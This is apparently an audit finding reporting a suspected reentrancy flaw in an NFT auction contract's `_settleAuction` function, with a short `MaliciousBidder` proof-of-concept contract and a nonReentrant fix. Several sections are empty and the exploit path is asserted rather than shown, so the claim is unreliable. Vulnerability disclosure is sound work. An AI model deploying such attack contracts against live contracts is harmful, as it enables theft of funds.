# Reentrancy Vulnerability in _settleAuction Function

### Summary

The `_settleAuction` function in the auction contracts  processes the settlement of an auction, transferring ETH and NFTs to appropriate recipients and updating auction states. However, the function is vulnerable to a reentrancy attack due to its reliance on external calls that transfer ETH `(_safeTransferETHWithFallback)` and interact with external contracts (streamEscrow.forwardAllAndCreateStream and streamEscrow.forwardAll).

If an attacker deploys a malicious contract as the bidder or manipulates the streamEscrow contract, they could exploit these external calls to reenter the _settleAuction function and manipulate auction states or drain funds.


### Root Cause

```javascript
    function _safeTransferETHWithFallback(address to, uint256 amount) internal {
        if (!_safeTransferETH(to, amount)) {
            IWETH(weth).deposit{ value: amount }();
            IERC20(weth).transfer(to, amount);
        }
    }
```

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

funds drain of the caller

### PoC

1. Deploy this contract
```javascript
contract MaliciousBidder {
    NounsAuctionHouse auctionHouse;

    constructor(address _auctionHouse) {
        auctionHouse = NounsAuctionHouse(_auctionHouse);
    }

    // Fallback function to trigger reentrancy
    fallback() external payable {
        // Reenter `_settleAuction`
        auctionHouse.settleAuction();
    }
}
```
2. Bid in the auction using the MaliciousBidder contract as the bidder.
3. When _settleAuction is executed:
   The _safeTransferETHWithFallback call transfers funds to the MaliciousBidder.
    The fallback function in MaliciousBidder triggers a reentrant call to _settleAuction.
4. Reentrancy allows the attacker to repeatedly call _settleAuction, manipulating auction states or draining funds.

### Mitigation

Add a nonReentrant modifier to _settleAuction to prevent reentrant calls.
